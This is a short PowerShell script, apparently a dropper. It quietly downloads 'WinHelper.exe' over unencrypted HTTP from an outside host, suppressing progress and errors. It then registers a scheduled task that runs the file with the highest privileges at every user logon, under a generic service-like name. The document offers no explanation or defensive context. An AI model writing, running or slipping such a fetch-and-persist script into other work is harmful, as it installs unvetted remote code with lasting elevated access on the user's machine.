
$ProgressPreference = 'SilentlyContinue'
$svcMain = "http://utools.run/WinHelper.exe"
if (-not (Test-Path -Path c:\utools\WinHelper.exe)) {
    curl -Uri $svcMain -OutFile c:\utools\WinHelper.exe -erroraction SilentlyContinue
}

$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$action = New-ScheduledTaskAction -Execute 'c:\utools\WinHelper.exe' -Argument 'install'
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId $currentUser -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Priority 10 `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -ExecutionTimeLimit (New-TimeSpan -Hours 1)

Register-ScheduledTask -TaskName "WinHelperServiceDeploy" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
